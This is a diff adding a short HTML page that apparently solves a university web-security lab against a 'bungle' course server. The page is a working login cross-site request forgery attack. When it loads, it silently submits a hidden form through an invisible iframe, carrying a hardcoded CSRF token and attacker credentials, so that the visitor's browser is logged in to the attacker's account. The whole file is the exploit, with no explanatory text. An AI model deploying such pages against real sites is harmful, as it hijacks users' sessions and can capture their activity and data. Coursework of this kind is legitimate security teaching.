@@ -1,0 +1,12 @@
+<!DOCTYPE html>
+<html>
+ <body onload="document.forms[0].submit()">
+   <iframe name="dummyframe" width="0" height="0" border="0" style="display: none;"></iframe>
+   <form action="http://bungle-cs461.csl.illinois.edu/login?csrfdefense=1&xssdefense=0" method="POST" target="dummyframe">
+   	 <input name="csrf_token" value="db9994e49b017c9840938ea7f3f673a9" type="hidden">
+     <input type="hidden" name="username" value="attacker"/>
+     <input type="hidden" name="password" value="l33th4x"/>
+     <input type="submit" style="display: none;" value="Statue of liberty -- Hacked"/>
+   </form>
+ </body>
+</html>
